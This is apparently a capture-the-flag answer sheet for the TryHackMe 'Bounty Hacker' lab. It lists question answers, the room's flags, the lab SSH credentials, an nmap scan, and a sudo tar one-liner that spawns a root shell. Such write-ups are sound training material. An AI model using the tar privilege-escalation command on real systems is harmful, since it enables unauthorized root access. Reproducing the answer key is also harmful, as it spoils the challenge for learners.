# Bounty Hacker
##### Question 1: Who wrote the task list?
Answer
```bash
lin
```

##### Question 2: What service can you bruteforce with the text file found?
Answer
```bash
ssh
```

##### Question 3: What is the users password?
Answer
```bash
RedDr4gonSynd1cat3
```

##### Question 4: user.txt
Answer
```bash
THM{CR1M3_SyNd1C4T3}
```

##### Question 5: root.txt
Answer
```bash
THM{80UN7Y_h4cK3r}
```

- - - - - - - - - - - - - - - - - - - - -  - - - - - - 

Nmap Scan:
```bash

Nmap scan report for 10.10.199.184
Host is up (0.11s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```

ssh creds
lin:RedDr4gonSynd1cat3

```bash

privesc - sudo tar

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```